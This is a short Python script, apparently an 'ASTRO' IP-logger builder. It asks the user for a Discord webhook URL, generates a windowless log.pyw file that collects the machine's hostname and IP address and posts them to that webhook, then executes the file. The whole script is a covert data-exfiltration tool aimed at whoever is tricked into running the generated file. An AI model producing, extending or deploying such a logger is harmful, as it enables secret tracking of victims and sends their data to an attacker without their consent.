import os
from colorama import init, Fore

init()

def print_ascii():
    ascii_art = """
    █████╗ ███████╗████████╗██████╗  ██████╗ 
    ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗
    ███████║███████╗   ██║   ██████╔╝██║   ██║
    ██╔══██║╚════██║   ██║   ██╔══██╗██║   ██║
    ██║  ██║███████║   ██║   ██║  ██║╚██████╔╝
    ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝  
    """
    print(Fore.MAGENTA + ascii_art)

def create_log_script(webhook_url):
    log_script_content = f"""
import os
import socket
import requests

hostname = socket.gethostname()
ipv4_address = socket.gethostbyname(hostname)

webhook_url = "{webhook_url}"
data = {{
    "content": f"Someone got logged IPv4: {{ipv4_address}}"
}}

try:
    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print("IP address sent successfully.")
    else:
        print("Failed to send IP address. Status code:", response.status_code)
except Exception as e:
    print("Error sending IP address:", str(e))
"""

    with open("log.pyw", "w") as file:
        file.write(log_script_content)
    print(Fore.MAGENTA + "Log script created: log.pyw")

def main():
    print_ascii()
    print(Fore.MAGENTA + "")
    webhook_url = input(Fore.MAGENTA + "Enter your Discord Webhook URL: ").strip()
    if webhook_url:
        create_log_script(webhook_url)
        print(Fore.MAGENTA + "Executing log.pyw...")
        os.system("start log.pyw")
    else:
        print(Fore.MAGENTA + "No webhook URL provided. Exiting.")

if __name__ == "__main__":
    main()
